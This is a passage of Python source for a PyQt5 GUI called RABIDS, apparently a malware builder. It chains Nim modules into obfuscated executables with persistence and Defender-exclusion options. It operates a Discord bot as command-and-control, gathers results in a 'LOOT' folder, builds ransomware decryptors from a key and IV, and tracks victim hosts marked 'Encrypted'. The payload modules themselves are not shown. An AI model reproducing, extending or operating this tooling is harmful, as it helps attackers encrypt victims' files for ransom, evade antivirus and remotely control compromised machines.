        save_btn_layout = QHBoxLayout(save_btn_container)
        save_btn_layout.setContentsMargins(15, 0, 15, 0)
        save_btn_layout.addWidget(save_settings_btn)
        settings_layout.addWidget(save_btn_container)


        # Silent Whispers Tab
        self.silent_whispers_widget = SilentWhispersWidget(self.script_dir)
        
        self.tab_widget.addTab(builder_widget, "BUILDER")
        self.tab_widget.addTab(output_widget, "OUTPUT")
        self.tab_widget.addTab(c2_widget, "C2")
        self.tab_widget.addTab(uncrash_widget, "KRASH")
        self.tab_widget.addTab(garbage_collector_widget, "GARBAGE COLLECTOR")
        self.tab_widget.addTab(self.silent_whispers_widget, "SILENT WHISPERS")
        self.tab_widget.addTab(docs_widget, "DOCUMENTATION")
        self.tab_widget.addTab(settings_widget, "SETTINGS")
        self.update_loot_folder_view()
        self.update_all_option_values()
        self.update_module_table() 
        self.update_options_layout()
        self.update_windows_only_options(self.target_os_combo.currentText())

    def on_tab_changed(self, index):
        if self.tab_widget.tabText(index) == "OUTPUT":
            self.update_loot_folder_view()
        elif self.tab_widget.tabText(index) == "GARBAGE COLLECTOR":
            self.update_restore_destination_view()

    def open_loot_folder(self):
        loot_dir = Path(self.script_dir) / 'LOOT'
        if not loot_dir.is_dir():
            self.log_message(f"loot directory not found: {loot_dir}", "error")
            loot_dir.mkdir(exist_ok=True)
            self.log_message(f"created loot directory: {loot_dir}", "system")

        if sys.platform == "win32":
            os.startfile(loot_dir)
        elif sys.platform == "darwin":
            subprocess.Popen(["open", str(loot_dir)])
        else:
            subprocess.Popen(["xdg-open", str(loot_dir)])
        self.update_loot_folder_view()

    def update_loot_folder_view(self):
        self.loot_files_list.clear()
        loot_dir = Path(self.script_dir) / 'LOOT'
        if not loot_dir.is_dir():
            self.loot_files_list.addItem("loot directory not found")
            return
        try:
            files = [f for f in loot_dir.iterdir() if f.is_file()]
            if not files:
                self.loot_files_list.addItem("loot directory is empty")
                return

            for file_path in sorted(files, key=os.path.getmtime, reverse=True):
                self.loot_files_list.addItem(QListWidgetItem(file_path.name))
        except Exception as e:
            self.loot_files_list.addItem(f"Error reading LOOT directory: {e}")

    def update_options_layout(self, focused_module=None):
        for i in reversed(range(self.options_layout.count())):
            layout_item = self.options_layout.itemAt(i)
            if layout_item.widget():
                layout_item.widget().deleteLater()
            elif layout_item.layout():
                while layout_item.layout().count():
                    child = layout_item.layout().takeAt(0)
                    if child.widget():
                        child.widget().deleteLater()
                layout_item.layout().deleteLater()
            elif layout_item.spacerItem():
                self.options_layout.removeItem(layout_item)
        self.option_inputs.clear()

        subtitle_font = QFont()
        subtitle_font.setPointSize(10)

        title_font = QFont()
        title_font.setBold(True)
        title_font.setPointSize(12)

        title_font = QFont()
        title_font.setBold(True)
        title_font.setPointSize(12)

        if not self.selected_modules:
            icon_label = QLabel()
            icon_path = os.path.join(self.script_dir, "ASSETS", "normal.png")
            pixmap = QPixmap(icon_path)
            if not pixmap.isNull():
                icon_label.setPixmap(pixmap.scaled(500, 500, Qt.KeepAspectRatio, Qt.SmoothTransformation))
            else:
                icon_label.setText("Add a module to see its options")
            icon_label.setAlignment(Qt.AlignCenter)
            self.options_layout.addStretch()
            self.options_layout.addWidget(icon_label, 0, Qt.AlignCenter)
            self.module_options_group.setTitle("MODULE OPTIONS")
            return

        modules_to_show = [focused_module] if focused_module else self.selected_modules

        if focused_module:
            self.module_options_group.setTitle(f"{focused_module.split('/')[-1].upper()} OPTIONS")
            self.module_options_group.setFont(title_font)
        else:
            self.module_options_group.setTitle("MODULE OPTIONS")

        has_any_options = False
        for module_name in modules_to_show:
            if module_name not in MODULE_OPTIONS or not MODULE_OPTIONS[module_name]:
                continue

            has_any_options = True

            if not focused_module and len(self.selected_modules) > 1:
                module_label = QLabel(f"{module_name.split('/')[-1].upper()} OPTIONS")
                module_label.setStyleSheet("font-weight: bold; color: #999;")
                module_label.setFont(title_font)
                self.options_layout.addWidget(module_label)

            module_defaults = MODULE_OPTIONS.get(module_name, {})
            module_current_values = self.current_option_values.get(module_name, {})
            
            for option, default_value in module_defaults.items():
                value = module_current_values.get(option, default_value)
                option_row = QHBoxLayout()
                option_label = QLabel(f"{option}:")
                option_label.setFont(subtitle_font)
                option_label.setStyleSheet("color: #F4A87C;")
                if option in ['persistence', 'defenderExclusion']:
                    input_widget = QCheckBox()
                    input_widget.setFont(subtitle_font)
                    try:
                        is_checked = str(value).lower() in ('true', '1', 'yes', 'on')
                        input_widget.setChecked(is_checked)
                    except:
                        input_widget.setChecked(False)
                else:
                    input_widget = QLineEdit(value)
                    input_widget.setFont(subtitle_font)

                if option in ['nimFile', 'embedFiles', 'dumpsterFile', 'inputDir', 'outputDir', 'targetDir']:
                    browse_btn = QPushButton("Browse...")
                    if option == 'embedFiles':
                        browse_btn.clicked.connect(partial(self.browse_open_files, input_widget))
                    else:
                        browse_btn.clicked.connect(partial(self.browse_open_file, input_widget))
                    option_row.addWidget(browse_btn)

                option_row.addWidget(option_label)
                option_row.addWidget(input_widget)
                self.options_layout.addLayout(option_row)
                self.option_inputs[f"{module_name}:{option}"] = input_widget
            if not focused_module:
                self.options_layout.addSpacing(10)

        if not has_any_options:
            no_options_label = QLabel("No configurable options for the selected module(s).")
            no_options_label.setFont(subtitle_font)
            no_options_label.setAlignment(Qt.AlignCenter)
            self.options_layout.addStretch()
            self.options_layout.addWidget(no_options_label, 0, Qt.AlignCenter)
            self.options_layout.addStretch()
        else:
            self.options_layout.addStretch()

    def update_all_option_values(self):
        """Gathers current values from all input widgets into self.current_option_values."""
        for key, widget in self.option_inputs.items():
            module_name, option_name = key.split(":")
            if module_name not in self.current_option_values:
                self.current_option_values[module_name] = {}
            
            if isinstance(widget, QLineEdit):
                value = widget.text()
            elif isinstance(widget, QCheckBox):
                value = str(widget.isChecked()).lower()
            else:
                continue
            self.current_option_values[module_name][option_name] = value

    def add_module(self):
        module_name = self.module_combo.currentText()
        if module_name == "SELECT MODULE":
            self.log_message("Error: No module selected.", "error")
            return
        full_module = f"module/{module_name}"
        if full_module in self.selected_modules:
            self.log_message(f"Error: Module {module_name} already added.", "error")
            return
        if full_module in MODULES:
            self.selected_modules.append(full_module)
            self.log_message(f"Added module: {module_name}", "success")
            self.update_all_option_values()
            self.update_module_table()
            self.update_options_layout()

    def remove_module(self, module_to_remove):
        """Removes a module from the selected_modules list by its full path."""
        if module_to_remove in self.selected_modules:
            self.selected_modules.remove(module_to_remove)
            module_name = os.path.basename(module_to_remove)
            self.log_message(f"Removed module: {module_name}", "system")
            self.update_all_option_values()
            self.update_module_table()
            self.update_options_layout()

    def on_module_item_clicked(self, item):
        """When a module in the chain is clicked, show its specific options."""
        self.update_options_layout(focused_module=item.data(Qt.UserRole))

    def reorder_modules(self, new_order):
        if self.selected_modules == new_order:
            return
        self.log_message("Module chain reordered.", "system")
        self.selected_modules = new_order
        self.update_module_table() 
 
    def update_module_table(self):
        self.module_table.setRowCount(len(self.selected_modules))
        for i, module in enumerate(self.selected_modules):
            module_name = module.split('/')[-1]
            name_item = QTableWidgetItem(module_name) 
            name_item.setFont(QFont("Arial", 10))
            name_item.setData(Qt.UserRole, module)
            name_item.setTextAlignment(Qt.AlignLeft | Qt.AlignVCenter)
            self.module_table.setItem(i, 0, name_item)

            remove_btn = QPushButton("X")
            remove_btn.setFont(QFont("Arial", 8))
            remove_btn.clicked.connect(partial(self.remove_module, module))
            self.module_table.setCellWidget(i, 1, remove_btn)

        for i in range(self.module_table.rowCount()):
            self.module_table.setRowHeight(i, 30)

    def toggle_obfuscation(self):
        self.ollvm_input.setEnabled(self.obfuscate_check.isChecked())

    def update_windows_only_options(self, os_name):
        if os_name in ("linux", "macos"):
            self.hide_console_check.setEnabled(False)
            self.obfuscate_check.setEnabled(False)
            self.obfuscate_check.setChecked(False)
            self.ollvm_input.setEnabled(False)
        else:
            self.hide_console_check.setEnabled(True)
            self.obfuscate_check.setEnabled(True)
            self.toggle_obfuscation()


    def show_loading_view(self):
        for i in reversed(range(self.options_layout.count())):
            layout_item = self.options_layout.itemAt(i)
            if layout_item.widget():
                layout_item.widget().deleteLater()
            elif layout_item.layout():
                while layout_item.layout().count():
                    child = layout_item.layout().takeAt(0)
                    if child.widget():
                        child.widget().deleteLater()
                layout_item.layout().deleteLater()
            elif layout_item.spacerItem():
                self.options_layout.removeItem(layout_item)

        self.option_inputs.clear()

        icon_label = QLabel()
        icon_path = os.path.join(self.script_dir, "ASSETS", "loading.gif")
        self.loading_movie = QMovie(icon_path)
        if not self.loading_movie.isValid():
            icon_label.setText("Building...")
            icon_label.setStyleSheet("color: #F4A87C;")
        else:
            icon_label.setMovie(self.loading_movie)
            original_size = self.loading_movie.frameRect().size()
            scaled_size = original_size.scaled(500, 500, Qt.KeepAspectRatio)
            self.loading_movie.setScaledSize(scaled_size)
            self.loading_movie.start()
        icon_label.setAlignment(Qt.AlignCenter)
        self.options_layout.addStretch()
        self.options_layout.addWidget(icon_label, 0, Qt.AlignCenter)
        self.options_layout.addStretch()
        QApplication.processEvents()

    def clear_loading_view(self):
        if self.loading_movie:
            self.loading_movie.stop()
            self.loading_movie = None
        for i in reversed(range(self.options_layout.count())):
            layout_item = self.options_layout.itemAt(i)
            if layout_item.widget():
                layout_item.widget().deleteLater()
            elif layout_item.layout():
                while layout_item.layout().count():
                    child = layout_item.layout().takeAt(0)
                    if child.widget():
                        child.widget().deleteLater()
                layout_item.layout().deleteLater()
            elif layout_item.spacerItem():
                self.options_layout.removeItem(layout_item)

    def log_message(self, message, msg_type="system"):
        if msg_type == "error":
            color = "#D81960"
        elif msg_type == "success":
            color = "#B7CE42"
        elif msg_type == "system":
            color = "#FFA473"
        else:
            color = "#00A9FD"
        
        if msg_type == "c2_sent":
            color = "#e0e0e0"
        elif msg_type == "c2_recv":
            color = "#B7CE42"


        if not message.strip():
            return

        self.output_log.append(f'<font color="{color}">{message}</font>')

    def show_result_view(self, is_success):
        self.clear_loading_view()
        image_name = "success.png" if is_success else "error.png"
        fallback_text = "SUCCESS" if is_success else "BUILD FAILED"

        icon_label = QLabel()
        icon_path = os.path.join(self.script_dir, "ASSETS", image_name)
        pixmap = QPixmap(icon_path)
        if not pixmap.isNull():
            icon_label.setPixmap(pixmap.scaled(500, 500, Qt.KeepAspectRatio, Qt.SmoothTransformation))
        else:
            icon_label.setText(fallback_text)
            icon_label.setStyleSheet(f"color: {'#B7CE42' if is_success else '#D81960'}; font-size: 24px; font-weight: bold;")

        icon_label.setAlignment(Qt.AlignCenter)
        self.options_layout.addStretch()
        self.options_layout.addWidget(icon_label, 0, Qt.AlignCenter)
        self.options_layout.addStretch()
        QApplication.processEvents()

    def restore_options_after_build(self):
        self.clear_loading_view()
        self.update_options_layout()

    def build_finished(self, return_code):
        self.clear_loading_view()
        is_success = (return_code == 0)

        if is_success:
            self.log_message("\n[+] Build finished successfully.", "success")
            self.module_options_group.setTitle("BUILD SUCCESS")
            self.update_loot_folder_view()
        else:
            self.log_message(f"\n[-] Build failed with exit code {return_code}.", "error")
            self.module_options_group.setTitle("ERROR SEE OUTPUT TAB")

        self.show_result_view(is_success)

        QTimer.singleShot(3000, self.restore_options_after_build)

        self.build_btn.setEnabled(True)

    def run_compiler(self):
        if not self.selected_modules:
            self.log_message("Error: No modules selected.", "error")
            return
        if not self.exe_name_input.text():
            self.log_message("Error: Output executable name is required.", "error")
            return
        if len(self.selected_modules) == 1:
            self.log_message("Error: At least two modules are required to build a chain.", "error")
            self.tab_widget.setCurrentIndex(1) # Switch to OUTPUT tab
            return

        loot_dir = Path(self.script_dir) / 'LOOT'
        loot_dir.mkdir(exist_ok=True)
        exe_name = self.exe_name_input.text()
        output_path = loot_dir / exe_name

        module_files = [f"MODULE/{Path(m).name}.nim" for m in self.selected_modules]
        cmd = [sys.executable, "compiler.py"]
        if len(self.selected_modules) > 1:
            cmd.extend(["--merge"] + module_files)
        elif module_files:
            cmd.extend(["--nim_file", module_files[0]])
        cmd.extend(["--output_exe", str(output_path)])
        target = f"{self.target_os_combo.currentText()}:{self.target_arch_combo.currentText()}"
        cmd.extend(["--target", target])

        self.update_all_option_values()

        options = []
        for module_name in self.selected_modules:
            if module_name in self.current_option_values:
                for option_name, value in self.current_option_values[module_name].items():
                    options.append(f"--option={option_name}={value}")

        if 'module/dumpster' in self.selected_modules:
            if not any("collectMode" in opt or "restoreMode" in opt for opt in options):
                 options.append("--option=collectMode=true")

        if self.obfuscate_check.isChecked():
            cmd.append("--obfuscate")
            if self.ollvm_input.text():
                cmd.extend(["--ollvm", self.ollvm_input.text().strip()])

        if self.hide_console_check.isChecked() and self.target_os_combo.currentText() == "windows":
            cmd.append("--hide-console")

        cmd.extend(options)

        self.module_options_group.setTitle("BUILDING PAYLOAD...")
        self.show_loading_view()
        self.build_btn.setEnabled(False)
        self.output_log.clear()

        self.log_message(f"Running command: {' '.join(shlex.quote(c) for c in cmd)}\n", "system")
        self.build_thread = BuildThread(cmd)
        self.build_thread.log_signal.connect(self.log_message)
        self.build_thread.finished_signal.connect(self.build_finished)
        self.build_thread.start()

    def show_garbage_loading_view(self):
        for i in reversed(range(self.restore_dest_files_list.count())):
            item = self.restore_dest_files_list.takeItem(i)
            del item

        self.restore_dest_files_list.clear()
        icon_label = QLabel()
        icon_path = os.path.join(self.script_dir, "ASSETS", "garbage.png")
        pixmap = QPixmap(icon_path)
        if not pixmap.isNull():
            icon_label.setPixmap(pixmap.scaled(300, 300, Qt.KeepAspectRatio, Qt.SmoothTransformation))
        else:
            icon_label.setText("Restoring...")
        list_item = QListWidgetItem()
        list_widget = QWidget()
        layout = QHBoxLayout(list_widget)
        layout.addWidget(icon_label)
        layout.setAlignment(Qt.AlignCenter)
        list_item.setSizeHint(list_widget.sizeHint())
        self.restore_dest_files_list.addItem(list_item)
        self.restore_dest_files_list.setItemWidget(list_item, list_widget)
        QApplication.processEvents()

    def clear_garbage_loading_view(self):
        for i in reversed(range(self.restore_dest_files_list.count())):
            item = self.restore_dest_files_list.takeItem(i)
            del item

        self.restore_dest_files_list.clear()
        QApplication.processEvents()


    def browse_directory(self, line_edit):
        directory = QFileDialog.getExistingDirectory(self, "Select Directory")
        if directory:
            home_path = str(Path.home())
            if directory.startswith(home_path):
                directory = directory.replace(home_path, "$HOME", 1)

            line_edit.setText(directory)

    def browse_open_file(self, line_edit):
        file_path, _ = QFileDialog.getOpenFileName(self, "Open Dumpster File", "", "All Files (*)")
        if file_path:
            home_path = str(Path.home())
            if file_path.startswith(home_path):
                line_edit.setText(file_path.replace(home_path, "$HOME", 1))
            else:
                line_edit.setText(file_path)

    def browse_open_files(self, line_edit):
        """Opens a file dialog to select multiple files and populates the line_edit with a comma-separated list."""
        file_paths, _ = QFileDialog.getOpenFileNames(self, "Select Files to Embed", "", "All Files (*)")
        if file_paths:
            home_path = str(Path.home())
            processed_paths = []
            for path in file_paths:
                if path.startswith(home_path):
                    processed_paths.append(path.replace(home_path, "$HOME", 1))
                else:
                    processed_paths.append(path)
            
            # Append to existing list or create a new one
            line_edit.setText(",".join(processed_paths))

    def run_garbage_collector_restore(self):
        self.update_restore_destination_view()
        dumpster_file = self.restore_dumpster_file_edit.text()
        output_dir = self.restore_output_dir_edit.text()
        if not dumpster_file or not output_dir:
            self.log_message("Error: Both dumpster file and output directory are required for restoration.", "error")
            return

        self.show_garbage_loading_view()
        self.tab_widget.setCurrentIndex(1)
        self.output_log.clear()

        cmd = [
            sys.executable, "compiler.py",
            "--nim_file", "MODULE/dumpster.nim",
            "--output_exe", str(Path(tempfile.gettempdir()) / "rabids_restore_tool"),
            "--option=restoreMode=true", f"--option=dumpsterFile={dumpster_file}", f"--option=outputDir={output_dir}"
        ]
        self.log_message(f"Running command: {' '.join(shlex.quote(c) for c in cmd)}", "system")
        self.build_thread = BuildThread(cmd)
        self.build_thread.log_signal.connect(self.log_message)
        self.build_thread.finished_signal.connect(self.build_finished)
        self.build_thread.start()

    def run_uncrash_compiler(self):
        exe_name = self.uncrash_exe_name_edit.text()
        if not exe_name:
            self.log_message("Error: Decryptor executable name is required.", "error")
            return

        self.tab_widget.setCurrentIndex(1)
        self.output_log.clear()
        self.log_message("Building decryptor...", "system")

        loot_dir = Path(self.script_dir) / 'LOOT'
        loot_dir.mkdir(exist_ok=True)
        output_path = loot_dir / exe_name

        key = self.uncrash_key_edit.text()
        iv = self.uncrash_iv_edit.text()
        ext = self.uncrash_ext_edit.text()

        cmd = [
            sys.executable, "compiler.py",
            "--nim_file", "MODULE/krash.nim",
            "--output_exe", str(output_path),
            "--target", f"{self.uncrash_os_combo.currentText()}:{self.uncrash_arch_combo.currentText()}",
            "--nim-only"
        ]

        options = [
            f"--option=key={key}",
            f"--option=iv={iv}",
            f"--option=extension={ext}",
            "--option=decrypt"
        ]
        cmd.extend(options)

        self.log_message(f"Running command: {' '.join(shlex.quote(c) for c in cmd)}\n", "system")
        self.build_thread = BuildThread(cmd)
        self.build_thread.log_signal.connect(self.log_message)
        self.build_thread.finished_signal.connect(self.build_finished)
        self.build_thread.start()

    def run_dependency_installer(self, commands):
        self.tab_widget.setCurrentIndex(self.tab_widget.indexOf(self.tab_widget.findChild(QWidget, "OUTPUT")))
        self.output_log.clear()
        self.log_message("Starting dependency installation...", "system")

        for btn in self.installer_buttons:
            btn.setEnabled(False)

        self.installer_thread = DependencyInstallerThread(commands)
        self.installer_thread.log_signal.connect(self.log_message)
        self.installer_thread.finished_signal.connect(self.on_installer_finished)
        self.installer_thread.start()

    def install_nim_tool(self):
        if sys.platform == "win32":
            from PyQt5.QtGui import QDesktopServices
            QDesktopServices.openUrl(QUrl("https://nim-lang.org/install_windows.html"))
            self.log_message("Opened browser to Nim installation page for Windows. Please download and run the installer.", "system")
        else:
            cmd = "curl https://nim-lang.org/choosenim/init.sh -sSf | sh -s -- -y"
            self.run_dependency_installer([cmd])

    def install_rust_tool(self):
        if sys.platform == "win32":
            from PyQt5.QtGui import QDesktopServices
            QDesktopServices.openUrl(QUrl("https://www.rust-lang.org/tools/install"))
            self.log_message("Opened browser to Rust installation page for Windows. Please download and run rustup-init.exe.", "system")
        else:
            cmd = "curl --tlsv1.2 -sSf https://sh.rustup.rs | sh -s -- -y"
            self.run_dependency_installer([cmd])

    def on_installer_finished(self):
        self.log_message("Dependency installation process finished.", "success")
        for btn in self.installer_buttons:
            btn.setEnabled(True)

    def run_python_installer(self):
        commands = [
            (sys.executable, "-m", "pip", "install", "--break-system-packages", "PyQt5", "discord"),
        ]
        self.run_dependency_installer(commands)

    def run_nim_installer(self):
        commands = [
            ("nimble", "install", "winim", "openssl", "discord", "nimcrypto", "clipb", "dimscord", "httpclient", "threadpool"),
        ]
        self.run_dependency_installer(commands)

    def run_rust_installer(self):
        commands = [
            ("rustup", "target", "add", "x86_64-pc-windows-gnu"),
            ("rustup", "target", "add", "aarch64-pc-windows-gnu"),
        ]
        self.run_dependency_installer(commands)

    def run_docker_installer(self):
        commands = [
            ("docker", "pull", "ghcr.io/joaovarelas/obfuscator-llvm-16.0:latest")
        ]
        self.run_dependency_installer(commands)

    def toggle_c2_connection(self):
        if self.c2_thread and self.c2_thread.isRunning():
            self.c2_thread.stop()
        else:
            token = self.settings_discord_token_edit.text().strip()
            target_id = self.settings_listener_creator_id_edit.text().strip()
            if not token or not target_id:
                self.log_c2_message("Bot Token and Target User ID are required.", "error")
                return
            
            self.c2_log.clear()
            self.log_c2_message("Connecting to Discord...", "system")
            self.c2_thread = C2Thread(token, target_id)
            self.c2_thread.log_message.connect(self.log_c2_message)
            self.c2_thread.connection_status.connect(self.on_c2_connection_status_changed)
            self.c2_thread.start()

    def on_c2_connection_status_changed(self, is_connected):
        self.c2_cmd_input.setEnabled(is_connected)
        self.c2_send_btn.setEnabled(is_connected)
        if is_connected:
            self.c2_connect_btn.setText("Disconnect")
        else:
            self.c2_connect_btn.setText("Connect")
            if self.c2_thread:
                self.c2_thread.quit()
                self.c2_thread.wait()
                self.c2_thread = None

    def log_c2_message(self, message, msg_type):
        color_map = {"error": "#D81960", "success": "#B7CE42", "system": "#FFA473", "c2_sent": "#e0e0e0", "c2_recv": "#B7CE42", "c2_debug": "#888888"}
        color = color_map.get(msg_type, "#00A9FD")
        self.c2_log.append(f'<font color="{color}">{message}</font>')

    def send_c2_message(self):
        content = self.c2_cmd_input.text().strip()
        if content and self.c2_thread and self.c2_thread.isRunning():
            self.c2_thread.send_message(content)
            self.c2_cmd_input.clear()

    def toggle_discord_listener(self):
        if self.discord_thread and self.discord_thread.isRunning():
            self.discord_thread.stop()
            self.toggle_listener_btn.setText("Connect")
            self.log_message("Discord listener disconnected.", "system")
        else:
            token = self.settings_discord_token_edit.text().strip()
            if not token:
                self.log_message("Error: Discord listener bot token is required.", "error")
                self.tab_widget.setCurrentIndex(self.tab_widget.indexOf(self.tab_widget.findChild(QWidget, "SETTINGS")))
                return

            creator_id = self.settings_listener_creator_id_edit.text().strip()

            if self.discord_thread and self.discord_thread.isRunning():
                self.log_message("Listener is already running.", "system")
                return

            self.discord_thread = DiscordListenerThread(token, creator_id)
            self.discord_thread.device_status_update.connect(self.update_device_status)
            self.discord_thread.start()
            self.toggle_listener_btn.setText("Disconnect")

    def on_discord_listener_status_changed(self, is_connected):
        self.toggle_listener_btn.setText("Disconnect" if is_connected else "Connect")
        if not is_connected and self.discord_thread:
            self.discord_thread = None

    def refresh_discord_listener(self):
        if self.discord_thread and self.discord_thread.isRunning():
            self.log_message("Requesting message refresh from Discord...", "system")
            self.discord_thread.refresh_messages()
        else:
            self.log_message("Error: Discord listener is not connected.", "error")

    def update_device_status(self, hostname, status):
        if hostname == "SYSTEM" or hostname == "ERROR":
            msg_type = "error" if hostname == "ERROR" else "system"
            self.log_message(f"Listener: {status}", msg_type)
            if "failed" in status:
                self.toggle_listener_btn.setText("Connect")
                self.toggle_listener_btn.setEnabled(True)
                self.on_discord_listener_status_changed(False)
        for row in range(self.encrypted_devices_table.rowCount()):
            item = self.encrypted_devices_table.item(row, 0)
            if item and item.text() == hostname:
                if status == "Decrypted":
                    self.encrypted_devices_table.removeRow(row) 
                return
        
        if status == "Encrypted":
            row_position = self.encrypted_devices_table.rowCount()
            self.log_message(f"Encryption confirmed on: {hostname}", "success")
            self.encrypted_devices_table.insertRow(row_position)
            self.encrypted_devices_table.setItem(row_position, 0, QTableWidgetItem(hostname))

    def update_restore_destination_view(self):
        self.clear_garbage_loading_view()
        self.restore_dest_files_list.clear()
        dest_dir_str = self.restore_output_dir_edit.text()
        if not dest_dir_str:
            self.restore_dest_files_list.addItem("Select a destination directory to see its contents.")
            return

        dest_dir = Path(dest_dir_str)
        if not dest_dir.is_dir():
            self.restore_dest_files_list.addItem(f"Directory does not exist: {dest_dir}")
            return
        try:
            files = list(dest_dir.iterdir())
            if not files:
                self.restore_dest_files_list.addItem("Destination directory is empty.")
                return
            for item_path in sorted(files):
                self.restore_dest_files_list.addItem(QListWidgetItem(item_path.name))
        except Exception as e:
            self.restore_dest_files_list.addItem(f"Error reading directory: {e}")

    def get_config_path(self):
        return os.path.join(self.script_dir, "rabids_config.json")

    def save_settings(self):
        self.update_all_option_values()
        config = {
            "builder": {
                "exe_name": self.exe_name_input.text(),
                "target_os": self.target_os_combo.currentText(),
                "target_arch": self.target_arch_combo.currentText(),
                "hide_console": self.hide_console_check.isChecked(),
                "obfuscate": self.obfuscate_check.isChecked(),
                "ollvm": self.ollvm_input.text(),
                "module_chain": self.selected_modules,
                "module_options": self.current_option_values
            },
            "uncrash": {
                "key": self.uncrash_key_edit.text(),
                "iv": self.uncrash_iv_edit.text(),
                "extension": self.uncrash_ext_edit.text(),
                "exe_name": self.uncrash_exe_name_edit.text(),
                "os": self.uncrash_os_combo.currentText(),
                "arch": self.uncrash_arch_combo.currentText()
            },
            "garbage_collector": {
                "dumpster_file": self.restore_dumpster_file_edit.text(),
                "output_dir": self.restore_output_dir_edit.text()
            },
            "listener": {
                "server_url": self.settings_server_url_edit.text()
            },
            "silent_whispers": self.silent_whispers_widget.get_settings() if self.silent_whispers_widget else {}
        }
        try:
            with open(self.get_config_path(), 'w') as f:
                json.dump(config, f, indent=4)
        except Exception as e:
            print(f"Error saving settings: {e}")

    def load_settings(self):
        config_path = self.get_config_path()
        if not os.path.exists(config_path):
            return
        try:
            with open(config_path, 'r') as f:
                config = json.load(f)

            builder_cfg = config.get("builder", {})
            self.exe_name_input.setText(builder_cfg.get("exe_name", "payload"))
            self.target_os_combo.setCurrentText(builder_cfg.get("target_os", "windows"))
            self.target_arch_combo.setCurrentText(builder_cfg.get("target_arch", "amd64"))
            self.hide_console_check.setChecked(builder_cfg.get("hide_console", True))
            self.obfuscate_check.setChecked(builder_cfg.get("obfuscate", False))
            self.ollvm_input.setText(builder_cfg.get("ollvm", ""))
            self.selected_modules = builder_cfg.get("module_chain", [])
            self.current_option_values = builder_cfg.get("module_options", {})

            uncrash_cfg = config.get("uncrash", {})
            self.uncrash_key_edit.setText(uncrash_cfg.get("key", ""))
            self.uncrash_iv_edit.setText(uncrash_cfg.get("iv", ""))
            self.uncrash_ext_edit.setText(uncrash_cfg.get("extension", ".locked"))
            self.uncrash_exe_name_edit.setText(uncrash_cfg.get("exe_name", "decryptor"))
            self.uncrash_os_combo.setCurrentText(uncrash_cfg.get("os", "windows"))
            self.uncrash_arch_combo.setCurrentText(uncrash_cfg.get("arch", "amd64"))

            gc_cfg = config.get("garbage_collector", {})
            self.restore_dumpster_file_edit.setText(gc_cfg.get("dumpster_file", ""))
            self.restore_output_dir_edit.setText(gc_cfg.get("output_dir", ""))

            listener_cfg = config.get("listener", {})
            self.settings_server_url_edit.setText(listener_cfg.get("server_url", "http://localhost:8080"))

            # Load Silent Whispers settings
            silent_whispers_cfg = config.get("silent_whispers", {})
            if self.silent_whispers_widget and silent_whispers_cfg:
                self.silent_whispers_widget.load_settings(silent_whispers_cfg)

        except (json.JSONDecodeError, KeyError) as e:
            print(f"Error loading settings from config file: {e}")

    def closeEvent(self, event):
        self.save_settings()
        super().closeEvent(event)

if __name__ == "__main__":
    app = QApplication(sys.argv)
    window = RABIDSGUI()
    window.show()
    sys.exit(app.exec_())